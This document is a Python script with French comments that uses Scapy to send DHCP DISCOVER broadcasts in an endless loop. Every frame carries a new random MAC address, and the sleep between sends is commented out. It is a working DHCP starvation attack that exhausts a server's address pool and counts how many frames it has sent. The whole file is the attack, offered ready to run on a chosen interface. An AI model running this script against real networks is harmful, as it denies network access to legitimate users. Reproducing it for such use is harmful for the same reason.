import signal
import time
import random
from scapy.all import *

# Variables globales pour suivre le nombre de trames et le temps de début
packet_count = 0
start_time = None


def random_mac():
    """Génère une adresse MAC aléatoire."""
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def create_dhcp_discover():
    """Crée une trame DHCP DISCOVER avec une adresse MAC aléatoire."""
    mac_address = random_mac()
    print(f"Adresse MAC aléatoire générée: {mac_address}")

    # Créer une trame Ethernet avec l'adresse MAC aléatoire
    eth = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac_address, type=0x0800)

    # Créer une trame IP
    ip = IP(src='0.0.0.0', dst='255.255.255.255')

    # Créer une trame UDP
    udp = UDP(sport=68, dport=67)

    # Créer une trame BOOTP
    bootp = BOOTP(chaddr=mac_address.replace(':', ''))

    # Créer une trame DHCP DISCOVER
    dhcp = DHCP(options=[('message-type', 'discover'), 'end'])

    # Assembler toutes les trames
    dhcp_discover_packet = eth / ip / udp / bootp / dhcp

    return dhcp_discover_packet


def send_dhcp_discover():
    """Envoie la trame DHCP DISCOVER sur le réseau."""
    global packet_count, start_time
    start_time = time.time()

    try:
        while True:
            packet = create_dhcp_discover()
            sendp(packet, iface="Wi-Fi")  # Remplacez "Wi-Fi" par l'interface réseau appropriée
            packet_count += 1
            # time.sleep(1) # Décommenter pour tester de manière soft (1 seconde de pause entre chaque requête)
    except KeyboardInterrupt:
        end_time = time.time()
        total_time = end_time - start_time
        print(f"\nScript arrêté. Temps d'exécution: {total_time:.2f} secondes")
        print(f"Nombre total de trames envoyées: {packet_count}")


def signal_handler(sig, frame):
    """Gestionnaire de signal pour capturer l'interruption du script."""
    end_time = time.time()
    total_time = end_time - start_time
    print(f"\nScript arrêté. Temps d'exécution: {total_time:.2f} secondes")
    print(f"Nombre total de trames envoyées: {packet_count}")
    exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    send_dhcp_discover()
